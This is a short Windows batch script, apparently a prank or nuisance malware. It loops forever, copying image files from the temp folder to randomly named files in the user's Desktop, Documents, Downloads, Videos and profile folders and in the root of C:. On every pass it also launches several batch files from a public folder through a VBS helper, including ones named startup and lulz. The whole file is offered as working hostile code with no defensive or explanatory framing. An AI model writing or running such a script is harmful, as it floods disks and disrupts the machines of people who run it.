@echo off
:loop
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%1.png
powershell cp %TEMP%\image2.jpg $env:%USERPROFILE%\Documents\%random%3.jpg
powershell cp %TEMP%\image3.jpg $env:%USERPROFILE%\Downloads\%random%2.jpg
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Videos\%random%1.png
powershell cp %TEMP%\image1.png $env:%USERPROFILE%\%random%1.png
powershell cp %TEMP%\image.png C:\%random%1.png
powershell cp %TEMP%\image3.png C:\%random%1.png
powershell cp %TEMP%\image2.png C:\%random%1.png
powershell cp %TEMP%\image3.png C:\Users\%random%1.png
powershell cp %TEMP%\image2.png %TEMP%\%random%1.png
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
goto loop
